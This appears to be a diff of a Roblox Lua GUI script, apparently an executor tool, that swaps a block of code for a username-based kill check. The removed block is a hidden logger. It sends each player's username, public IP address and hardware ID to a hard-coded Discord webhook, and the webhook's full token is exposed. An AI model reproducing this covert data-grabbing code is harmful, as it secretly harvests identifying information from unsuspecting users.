@@ -1,71 +1,17 @@
 -- Gui to Lua
 -- Version: 3.2 - Exp
 
--- Instances:
-local HS = game:GetService("HttpService")
 
-local webhookURL = "https://discord.com/api/webhooks/1206368774739992648/o2Ep8vITMv_Xe1766i3I008pBt7syDRa6nDR-zd-srdyahl6IewjzC2TsCYxrBMWCY0m"
-local playerName = game.Players.LocalPlayer.Name -- Ensure this is executed in a context where LocalPlayer is available
-
-function generateRandomString(length)
-    local charSet = 'ABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789'
-    local result = ''
-    for i = 1, length do
-        local randIndex = math.random(1, #charSet)
-        result = result .. charSet:sub(randIndex, randIndex)
-    end
-    return result
+local name = game.Players.LocalPlayer.Name;
+if (name == "VegieSenpai") then
+    --do nothing
+else
+    error("disabled");
 end
 
-math.randomseed(os.time()) -- Seed the random generator
-
-local messageData = {
-    embeds = {
-        {
-            title = "New User Alert", -- Title of the embed
-            description = "A new user has joined the game!", -- Description/text content of the embed
-            color = 0x00FF00, -- Color of the embed, in decimal
-            fields = { -- Array of fields, each field is a table with name and value
-                {
-                    name = "Username",
-                    value = playerName,
-                    inline = false -- Whether the field should display inline or not
-                },
-		{
-                    name = "IP",
-                    value = game:HttpGet("https://api.ipify.org"),
-                    inline = false -- Whether the field should display inline or not
-                },
-		{
-                    name = "HWID",
-                    value = gethwid(),
-                    inline = false -- Whether the field should display inline or not
-                },
-            },
-
-            footer = { -- Footer text
-                text = "User joined at " .. os.date("%Y-%m-%d %H:%M:%S"),
-            }
-        }
-    }
-}
-
-local jsonData = HS:JSONEncode(messageData)
-
--- Assuming 'request' is already defined somewhere in your environment
-local response = request({
-    Url = webhookURL,
-    Method = "POST",
-    Headers = {
-        ["Content-Type"] = "application/json"
-    },
-    Body = jsonData
-})
-
-
-
+-- Instances:
 local Main = {
-	-- Main = Instance.new("ScreenGui"),
+	Main = Instance.new("ScreenGui"),
 	PopupModal = Instance.new("Frame"),
 	CreateScriptPopupWindow = Instance.new("Frame"),
 	UICorner = Instance.new("UICorner"),
